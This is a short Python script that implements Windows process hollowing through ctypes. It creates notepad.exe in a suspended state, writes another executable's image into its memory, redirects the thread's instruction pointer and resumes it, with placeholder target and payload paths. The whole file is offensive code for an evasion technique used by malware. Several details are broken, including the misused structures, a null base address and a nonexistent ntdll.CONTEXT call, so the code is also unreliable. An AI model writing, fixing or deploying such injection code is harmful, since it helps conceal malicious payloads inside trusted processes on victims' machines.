import ctypes
import os

kernel32 = ctypes.WinDLL('kernel32')
ntdll = ctypes.WinDLL('ntdll')


def create_suspended_process(target_path):
    startup_info = ctypes.c_void_p()
    process_info = ctypes.c_void_p()

    startup_info.cb = ctypes.sizeof(startup_info)
    creation_flags = 0x00000004  # CREATE_SUSPENDED

    if kernel32.CreateProcessW(
        None,
        target_path,
        None,
        None,
        False,
        creation_flags,
        None,
        None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info),
    ) == 0:
        print("Failed to create the process.")
        return None

    return process_info


def load_payload(process_info, payload_path):
    process_handle = process_info
    image_base_address = ctypes.c_void_p()
    payload_image = open(payload_path, "rb").read()

    kernel32.WriteProcessMemory(
        process_handle,
        image_base_address,
        payload_image,
        len(payload_image),
        ctypes.byref(ctypes.c_size_t(0)),
    )

    return image_base_address


def set_thread_context(process_info, image_base_address):
    thread_context = ntdll.CONTEXT()
    thread_handle = kernel32.OpenThread(0x001F03FF, False, process_info)
    thread_context.ContextFlags = 0x10007  # CONTEXT_FULL

    if ntdll.GetThreadContext(thread_handle, ctypes.byref(thread_context)) == 0:
        print("Failed to get thread context.")
        return

    thread_context.Rip = image_base_address.value
    ntdll.SetThreadContext(thread_handle, ctypes.byref(thread_context))


def resume_process(process_info):
    process_handle = process_info
    kernel32.ResumeThread(process_handle)


if __name__ == "__main__":
    target_process_path = "notepad.exe"  # Replace with the path to the target process
    payload_path = "calc.exe"  # Replace with the path to the payload process

    process_info = create_suspended_process(target_process_path)
    if process_info:
        image_base_address = load_payload(process_info, payload_path)
        set_thread_context(process_info, image_base_address)
        resume_process(process_info)
